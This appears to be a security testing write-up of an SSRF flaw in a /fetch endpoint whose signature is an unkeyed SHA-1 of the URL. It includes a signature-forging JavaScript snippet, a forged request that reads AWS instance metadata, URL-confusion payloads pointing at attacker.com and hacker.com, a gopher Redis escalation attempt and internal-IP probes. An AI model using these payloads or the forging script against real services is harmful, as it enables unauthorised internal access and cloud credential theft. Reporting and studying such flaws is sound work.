### Weak Signature Validation Enables Server-Side Request Forgery (SSRF)

## 

## Executive Summary

The `/fetch` endpoint of `https://cdc975682d.0o8.ir` accepts a JSON request containing a `data` parameter and a `signature` parameter.

During testing, the signature was found to be a 40-character hexadecimal value that exactly matches the SHA-1 hash of the decoded URL.

The validation mechanism appears to rely on the following construction:

```text
signature = SHA1(URL)
```

Since SHA-1 is a publicly computable hash function and does not incorporate a secret key, a client can independently generate a valid signature for a URL of its choosing.

Testing with a controlled OAST Collaborator domain resulted in both DNS and HTTP interactions, demonstrating server-side outbound requests to the supplied domain.

```http
POST /fetch HTTP/2
Host: cdc975682d.0o8.ir
Content-Type: application/json

{   
    "data": "YUhSMGNEb3ZMMkZxZURNNVpEaG5jakV3WVdGeE9UUjJlbWR1YjJ0c09EQjZObkoxYTNZNGF5NXZZWE4wYVdaNUxtTnZiUzl6YzNKbUxYUmxjM1E9",  
    "signature": "a6c75f096db0dc4851177ce7b23c8dd8698201da"
}
```

### 

# Testing Step By Step

## 1. Signature Parameter Bypass Tests

1. Signature value modification.   
   
   ```
     "signature": "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
   ```

2. Empty signature value.
   
   ```
     "signature": ""
   ```

3. Missing `signature` parameter.
   
   ```
   {
     "data": "VALID_DATA"
   }
   ```

4. `null` signature value.
   
   ```
     "signature": null
   ```

5. Changing signature length.
   
   ```
   {"data":"VALID_DATA","signature":"a"}
   ```

6. Adding whitespace before or after the signature.
   
   ```
     "signature": " a6c75f096db0dc4851177ce7b23c8dd8698201da "
   ```

7. ```
   {
     "data": "VALID_DATA",
     "signature": "INVALID_SIGNATURE",
     "signature": "VALID_SIGNATURE"
   }
   ```

8. JSON type manipulation (string, number, boolean, array, object).
   
   ```
     {"data":"VALID_DATA","signature":123456}
     {"data":"VALID_DATA","signature":true}
     {"data":"VALID_DATA","signature":[]}
     {"data":"VALID_DATA","signature":{"value"}}
   ```

## 2. data Param Manipullation

##### The URL below was originally stored in the `data` parameter and was Base64-encoded twice. The targets listed below demonstrate URL manipulation attempts using this original URL.

```url
https://api.coingecko.com/api/v3/simple/price?ids=bitcoin&vs_currencies=usd,eur,gbp,jpy,cad,aud&include_24hr_change=true
```

```url
https://attacker.comhttps://target.com/path
https://attacker.com@target.com/path
https://attacker.com#https://target.com/path
https://attacker.com?url=https://target.com/path
https://attacker.com/https://target.com/path
https://attacker.com\@target.com/path

https://target.com/path@attacker.com
https://target.com/path#@attacker.com
https://target.com/path?@attacker.com
https://target.com/path/../@attacker.com
https://target.com/path%40attacker.com
https://target.com/path%23@attacker.com


https://target.com@hacker.com/target.com
https://target.com@hacker.com//target.com
https://target.com@hacker.com/https://target.com
https://target.com@hacker.com#target.com
https://target.com@hacker.com/#target.com
https://target.com%255c@hacker.com/target.com
```

## 3. SHA-1 Signature Analysis

### **SHA-1 Signature Analysis**

**1. Decoded the** `data` **parameter twice using Base64.**

```url
https://api.coingecko.com/api/v3/simple/price?ids=bitcoin&vs_currencies=usd,eur,gbp,jpy,cad,aud&include_24hr_change=true
```

**2. Identified the signature algorithm:**

```
SHA1(original_URL)
```

**3. Verified the signature against the original URL:**

```
const signature = SHA1(url);
```

##### **4. Confirmed that no`secret` key or HMAC was used.**

**5. Generated a valid signature for a modified URL**

### Observe server-side interaction

The OAST Collaborator recorded:

- DNS interaction

- HTTP interaction

These interactions demonstrate that the backend initiated outbound communication with the supplied controlled domain.

#### Script For Generate Signature Of URL :

```javascript
(async () => {
  const url = prompt("Enter URL:");

  if (!url) return;

  const data = btoa(btoa(url));

  const digest = await crypto.subtle.digest(
    "SHA-1",
    new TextEncoder().encode(url)
  );

  const signature = Array.from(new Uint8Array(digest))
    .map(b => b.toString(16).padStart(2, "0"))
    .join("");

  const result = JSON.stringify(
    { data, signature, url },
    null,
    2
  );

  console.log(result);
  await navigator.clipboard.writeText(result);

  console.log("Copied to clipboard!");
})();
```

## SSRF to Read AWS meta-data

```json
{
  "data": "YUhSMGNEb3ZMekUyT1M0eU5UUXVNVFk1TGpJMU5DOXNZWFJsYzNRdmJXVjBZUzFrWVhSaEx3PT0=",
  "signature": "0ccb496127f4b822d7284638041456c0cf9903a9"
}

 "url": "http://169.254.169.254/latest/meta-data/"
```

### response :

```josn
ami-id
ami-launch-index
ami-manifest-path
block-device-mapping/
hostname
instance-action
instance-id
instance-type
local-hostname
local-ipv4
placement/
public-hostname
public-ipv4
reservation-id
security-groups
```



## **RCE Escalation Attempts**

**1. Attempted to escalate the confirmed SSRF vulnerability to Remote Code                               Execution (RCE).**

**2. Tested the Gopher protocol against the internal Redis service:`**

```
gopher://
```

**3. The application returned an unsupported protocol error.**

## 

## SSRF to Internal Access

**1. Tested internal destinations:**

```
http://localhost/
http://127.0.0.1/
http://[::1]/
```

**2. Tested multiple private/internal IP addresses.**

**3. All internal requests returned HTTP 403 with the following response:**

```
Please don't hack me.
```
